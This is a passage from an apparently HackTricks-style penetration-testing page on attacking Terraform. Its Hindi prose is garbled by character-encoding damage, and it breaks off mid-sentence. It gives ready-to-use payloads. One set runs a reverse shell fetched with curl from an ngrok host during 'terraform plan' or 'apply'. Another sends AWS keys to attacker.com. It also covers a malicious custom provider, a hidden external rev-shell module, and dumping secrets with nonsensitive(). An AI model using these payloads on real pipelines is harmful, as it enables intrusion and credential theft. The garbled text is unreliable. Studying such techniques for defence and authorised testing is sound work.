# Terraform Security

{{#include ../banners/hacktricks-training.md}}

## Basic Information

[From the docs:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform рдПрдХ **infrastructure as code tool** рд╣реИ рдЬреЛ рдЖрдкрдХреЛ **cloud рдФрд░ on-prem resources** рдХреЛ рдорд╛рдирд╡-рдкрдардиреАрдп рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рд╕рдВрд╕реНрдХрд░рдг, рдкреБрди: рдЙрдкрдпреЛрдЧ рдФрд░ рд╕рд╛рдЭрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдлрд┐рд░ рдЕрдкрдиреЗ рд╕рднреА рдмреБрдирд┐рдпрд╛рджреА рдврд╛рдВрдЪреЗ рдХреЛ рдЙрд╕рдХреЗ рдЬреАрд╡рди рдЪрдХреНрд░ рдХреЗ рджреМрд░рд╛рди рдкреНрд░рд╛рд╡рдзрд╛рди рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реБрд╕рдВрдЧрдд рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред Terraform рдирд┐рдореНрди-рд╕реНрддрд░реАрдп рдШрдЯрдХреЛрдВ рдЬреИрд╕реЗ рдХрдВрдкреНрдпреВрдЯ, рд╕реНрдЯреЛрд░реЗрдЬ, рдФрд░ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рд╕рд╛рде-рд╕рд╛рде рдЙрдЪреНрдЪ-рд╕реНрддрд░реАрдп рдШрдЯрдХреЛрдВ рдЬреИрд╕реЗ DNS рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпреЛрдВ рдФрд░ SaaS рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░ рд╕рдХрддрд╛ рд╣реИред

#### Terraform рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ?

Terraform рдХреНрд▓рд╛рдЙрдб рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдореЛрдВ рдФрд░ рдЕрдиреНрдп рд╕реЗрд╡рд╛рдУрдВ рдкрд░ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдЙрдирдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рдЗрдВрдЯрд░рдлреЗрд╕ (APIs) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрдирд╛рддрд╛ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред рдкреНрд░рджрд╛рддрд╛ Terraform рдХреЛ рдХрд┐рд╕реА рднреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдпрд╛ рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдмрдирд╛рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╕реБрд▓рдн API рд╣реЛрддрд╛ рд╣реИред

![](<../images/image (177).png>)

HashiCorp рдФрд░ Terraform рд╕рдореБрджрд╛рдп рдиреЗ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА **1700 рд╕реЗ рдЕрдзрд┐рдХ рдкреНрд░рджрд╛рддрд╛** рд▓рд┐рдЦреЗ рд╣реИрдВ рдЬреЛ рд╣рдЬрд╛рд░реЛрдВ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рддреЗ рд╣реИрдВ, рдФрд░ рдпрд╣ рд╕рдВрдЦреНрдпрд╛ рдмрдврд╝рддреА рдЬрд╛ рд░рд╣реА рд╣реИред рдЖрдк рд╕рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЙрдкрд▓рдмреНрдз рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЛ [Terraform Registry](https://registry.terraform.io/) рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, рдФрд░ рдХрдИ рдЕрдиреНрдп рд╢рд╛рдорд┐рд▓ рд╣реИрдВред

рдореБрдЦреНрдп Terraform рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣ рддреАрди рдЪрд░рдгреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рд╣реИ:

- **Write:** рдЖрдк рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдЬреЛ рдХрдИ рдХреНрд▓рд╛рдЙрдб рдкреНрд░рджрд╛рддрд╛рдУрдВ рдФрд░ рд╕реЗрд╡рд╛рдУрдВ рдореЗрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреНрд▓рд╛рдЙрдб (VPC) рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореВрд╣реЛрдВ рдФрд░ рдПрдХ рд▓реЛрдб рдмреИрд▓реЗрдВрд╕рд░ рдХреЗ рд╕рд╛рде рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрдиреЛрдВ рдкрд░ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рддреИрдирд╛рдд рдХрд░рддрд╛ рд╣реИред
- **Plan:** Terraform рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЬрдирд╛ рдмрдирд╛рддрд╛ рд╣реИ рдЬреЛ рдЙрд╕ рдмреБрдирд┐рдпрд╛рджреА рдврд╛рдВрдЪреЗ рдХрд╛ рд╡рд░реНрдгрди рдХрд░рддреА рд╣реИ рдЬрд┐рд╕реЗ рдпрд╣ рдмрдирд╛рдПрдЧрд╛, рдЕрдкрдбреЗрдЯ рдХрд░реЗрдЧрд╛, рдпрд╛ рдирд╖реНрдЯ рдХрд░реЗрдЧрд╛ рдЬреЛ рдореМрдЬреВрджрд╛ рдмреБрдирд┐рдпрд╛рджреА рдврд╛рдВрдЪреЗ рдФрд░ рдЖрдкрдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╣реИред
- **Apply:** рдЕрдиреБрдореЛрджрди рдкрд░, Terraform рд╕рд╣реА рдХреНрд░рдо рдореЗрдВ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рд╕рдВрдЪрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ, рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдирд┐рд░реНрднрд░рддрд╛рдУрдВ рдХрд╛ рд╕рдореНрдорд╛рди рдХрд░рддреЗ рд╣реБрдПред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ VPC рдХреА рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ VPC рдореЗрдВ рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрдиреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдмрджрд▓рддреЗ рд╣реИрдВ, рддреЛ Terraform рд╡рд░реНрдЪреБрдЕрд▓ рдорд╢реАрдиреЛрдВ рдХреЛ рд╕реНрдХреЗрд▓ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ VPC рдХреЛ рдлрд┐рд░ рд╕реЗ рдмрдирд╛рдПрдЧрд╛ред

![](<../images/image (215).png>)

### Terraform Lab

рдмрд╕ рдЕрдкрдиреЗ рдХрдВрдкреНрдпреВрдЯрд░ рдореЗрдВ terraform рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВред

рдпрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) рд╣реИ рдФрд░ рдпрд╣рд╛рдБ рдЖрдкрдХреЗ рдкрд╛рд╕ terraform рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ [best way](https://www.terraform.io/downloads) рд╣реИред

## RCE in Terraform: config file poisoning

Terraform рдореЗрдВ **рдХреЛрдИ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдирд╣реАрдВ рд╣реИ рдЬреЛ рдПрдХ рд╡реЗрдм рдкреГрд╖реНрда рдпрд╛ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рддрд╛ рд╣реИ** рдЬрд┐рд╕реЗ рд╣рдо рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП, terraform рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдХрд╛ рдПрдХрдорд╛рддреНрд░ рддрд░реАрдХрд╛ рд╣реИ **terraform рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛** рдпрд╛ **terraform рд╕реНрдерд┐рддрд┐ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛** (рдиреАрдЪреЗ рдЕрдзреНрдпрд╛рдп рджреЗрдЦреЗрдВ)ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, terraform рдПрдХ **рдмрд╣реБрдд рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдШрдЯрдХ** рд╣реИ рдЬрд┐рд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рдкрд╛рд╕ рд╡рд┐рднрд┐рдиреНрди рд╕реНрдерд╛рдиреЛрдВ рддрдХ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдкрд╣реБрдВрдЪ** рд╣реЛрдЧреА рддрд╛рдХрд┐ рдпрд╣ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдХрд╛рдо рдХрд░ рд╕рдХреЗред

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рдЙрд╕ рдкреНрд░рдгрд╛рд▓реА рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдХрд╛ рдореБрдЦреНрдп рддрд░реАрдХрд╛ рдЬрд╣рд╛рдВ terraform рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рд╡рд╣ рд╣реИ **terraform рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рд╕реНрдЯреЛрд░ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдирд╛**, рдХреНрдпреЛрдВрдХрд┐ рдХрд┐рд╕реА рдмрд┐рдВрджреБ рдкрд░ рдЙрдиреНрд╣реЗрдВ **рд╡реНрдпрд╛рдЦреНрдпрд╛рдпрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ, рд╡рд╣рд╛рдБ рдРрд╕реЗ рд╕рдорд╛рдзрд╛рди рд╣реИрдВ рдЬреЛ **PR** рдмрдирдиреЗ рдХреЗ рдмрд╛рдж рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ terraform plan/apply рдХреЛ **execute** рдХрд░рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

рдпрджрд┐ рдЖрдк рдПрдХ terraform рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИрдВ, рддреЛ рдЬрдм рдХреЛрдИ `terraform plan` рдпрд╛ `terraform apply` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ RCE рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЗ рдкрд╛рд╕ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

### Terraform plan

Terraform plan terraform рдореЗрдВ **рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдХрдорд╛рдВрдб** рд╣реИ рдФрд░ рдбреЗрд╡рд▓рдкрд░реНрд╕/рд╕рдорд╛рдзрд╛рди рдЬреЛ terraform рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕реЗ рд╣рд░ рд╕рдордп рдХреЙрд▓ рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП **RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛** рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реИ рдХрд┐ рдЖрдк рдПрдХ terraform рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╡рд┐рд╖рд╛рдХреНрдд рдХрд░реЗрдВ рдЬреЛ `terraform plan` рдореЗрдВ рдордирдорд╛рдиреЗ рдЖрджреЗрд╢реЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧреАред

**рдПрдХ рдмрд╛рд╣рд░реА рдкреНрд░рджрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛**

Terraform [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ Terraform рдФрд░ рдмрд╛рд╣рд░реА рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреЗ рдмреАрдЪ рдЗрдВрдЯрд░рдлреЗрд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЖрдк `plan` рдХреЗ рджреМрд░рд╛рди рдордирдорд╛рдиреА рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП `external` рдбреЗрдЯрд╛ рд╕реНрд░реЛрдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдПрдХ terraform рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреА рддрд░рд╣ рдХреБрдЫ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рд╕реЗ `terraform plan` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**рдХрд╕реНрдЯрдо рдкреНрд░рджрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛**

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ [рдХрд╕реНрдЯрдо рдкреНрд░рджрд╛рддрд╛](https://learn.hashicorp.com/tutorials/terraform/provider-setup) рдХреЛ [Terraform Registry](https://registry.terraform.io/) рдкрд░ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рдПрдХ рдлреАрдЪрд░ рдмреНрд░рд╛рдВрдЪ рдореЗрдВ Terraform рдХреЛрдб рдореЗрдВ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ ([рдпрд╣рд╛рдВ рд╕реЗ рдЙрджрд╛рд╣рд░рдг](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
рдкреНрд░рджрд╛рддрд╛ `init` рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬрдм `plan` рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ рддреЛ рдпрд╣ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдЪрд▓рд╛рдПрдЧрд╛ред

рдЖрдк рдПрдХ рдЙрджрд╛рд╣рд░рдг [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec) рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

**рдПрдХ рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрдн рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛**

рджреЛрдиреЛрдВ рдЙрд▓реНрд▓реЗрдЦрд┐рдд рд╡рд┐рдХрд▓реНрдк рдЙрдкрдпреЛрдЧреА рд╣реИрдВ рд▓реЗрдХрд┐рди рдмрд╣реБрдд рдЫрд┐рдкреЗ рд╣реБрдП рдирд╣реАрдВ рд╣реИрдВ (рджреВрд╕рд░рд╛ рдЕрдзрд┐рдХ рдЫрд┐рдкрд╛ рд╣реБрдЖ рд╣реИ рд▓реЗрдХрд┐рди рдкрд╣рд▓реЗ рд╕реЗ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИ)ред рдЖрдк рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдПрдХ **рдЕрдзрд┐рдХ рдЫрд┐рдкреЗ рд╣реБрдП рддрд░реАрдХреЗ** рд╕реЗ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрди рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ:

- Terraform рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕реАрдзреЗ rev shell рдЬреЛрдбрд╝рдиреЗ рдХреЗ рдмрдЬрд╛рдп, рдЖрдк **рдПрдХ рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рд╕рдореЗрдВ rev shell рд╢рд╛рдорд┐рд▓ рд╣реИ:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
рдЖрдк рд░рд┐рд╡ рд╢реЗрд▓ рдХреЛрдб [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules) рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

- рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрди рдореЗрдВ, **ref** рдлреАрдЪрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ **repo рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╢рд╛рдЦрд╛ рдореЗрдВ terraform rev shell рдХреЛрдб** рдЫрд┐рдкрд╛ рд╕рдХреЗрдВ, рдХреБрдЫ рдЗрд╕ рддрд░рд╣: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply рд╕рднреА рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЖрдк рдЗрд╕реЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг Terraform рдлрд╝рд╛рдЗрд▓ рдХреЛ** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)** рдХреЗ рд╕рд╛рде рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗред**\
рдЖрдкрдХреЛ рдмрд╕ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕реЗ рдХреБрдЫ рдкреЗрд▓реЛрдб `main.tf` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рдПрдВ:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
рдкрд┐рдЫрд▓реА рддрдХрдиреАрдХ рд╕реЗ **рд╕реБрдЭрд╛рд╡реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ** рддрд╛рдХрд┐ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ **рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрднреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдзрд┐рдХ рдЫрд┐рдкреЗ рд╣реБрдП рддрд░реАрдХреЗ рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред

## Secrets Dumps

рдЖрдк **terraform рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдЧреБрдкреНрдд рдорд╛рдиреЛрдВ рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** `terraform apply` рдЪрд▓рд╛рдХрд░, terraform рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдЬреЛрдбрд╝рдХрд░:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Terraform State Files рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ terraform state files рдкрд░ рд▓рд┐рдЦрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рд╣реИ рд▓реЗрдХрд┐рди рдЖрдк terraform рдХреЛрдб рдХреЛ рдмрджрд▓ рдирд╣реАрдВ рд╕рдХрддреЗ, рддреЛ [**рдпрд╣ рд╢реЛрдз**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) рдлрд╝рд╛рдЗрд▓ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рд╡рд┐рдХрд▓реНрдк рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рднрд▓реЗ рд╣реА рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЛрдВ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ рд╣реЛ, state рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд╡реЗрдХреНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЕрдХреНрд╕рд░ рдЕрдзрд┐рдХ рдЪрд╛рд▓рд╛рдХ рд╣реЛрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЖрдк `git` рдЗрддрд┐рд╣рд╛рд╕ рдореЗрдВ рдХреЛрдИ рдирд┐рд╢рд╛рди рдирд╣реАрдВ рдЫреЛрдбрд╝рддреЗред

### Terraform рдореЗрдВ RCE: рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рд╡рд┐рд╖рд╛рдХреНрддрддрд╛

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ [рдПрдХ рдХрд╕реНрдЯрдо рдкреНрд░рджрд╛рддрд╛ рдмрдирд╛рдПрдБ](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) рдФрд░ рдмрд╕ terraform state рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдкреНрд░рджрд╛рддрд╛ рдХреЛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдкреНрд░рджрд╛рддрд╛ рд╕реЗ рдмрджрд▓ рджреЗрдВ рдпрд╛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдкреНрд░рджрд╛рддрд╛ рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ рдирдХрд▓реА рд╕рдВрд╕рд╛рдзрди рдЬреЛрдбрд╝реЗрдВред

рдкреНрд░рджрд╛рддрд╛ [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) рдЗрд╕ рд╢реЛрдз рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИ рдФрд░ рдЗрд╕ рд╕рд┐рджреНрдзрд╛рдВрдд рдХреЛ рд╣рдерд┐рдпрд╛рд░ рдмрдирд╛рддрд╛ рд╣реИред рдЖрдк рдПрдХ рдирдХрд▓реА рд╕рдВрд╕рд╛рдзрди рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ `command` рд╡рд┐рд╢реЗрд╖рддрд╛ рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдЪреНрдЫрд┐рдд рдордирдорд╛рдирд╛ bash рдХрдорд╛рдВрдб рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЬрдм `terraform` рд░рди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ `terraform plan` рдФрд░ `terraform apply` рдЪрд░рдгреЛрдВ рдореЗрдВ рдкрдврд╝рд╛ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред `terraform apply` рдЪрд░рдг рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, `terraform` рдЖрдкрдХреЗ рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ 